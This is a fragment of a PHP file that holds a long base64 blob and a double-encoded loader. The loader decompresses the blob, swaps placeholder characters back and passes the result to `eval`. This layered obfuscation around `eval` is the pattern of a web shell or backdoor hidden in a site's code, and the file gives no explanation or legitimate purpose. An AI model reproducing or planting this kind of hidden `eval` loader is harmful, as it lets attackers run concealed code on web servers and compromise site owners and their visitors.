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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="loXzhn6Jww36UoHzxOUEzkM5z5pcUFBwQk0c3us+kAgGioGBkQhd52T9Ch1VFZS7rH/vvda3Cuq//+sfjuy4vCa7/2YN7d+8zv7nz//8gcQdxi7uXS3JfDa4MgwIHq00mbo1Q86j2aalwFhr6im6g3y2T0nn4rGITGkVu+HXgFVeAnfjE7UTfUiREnUBAGVRJhnOjGeO";
?>
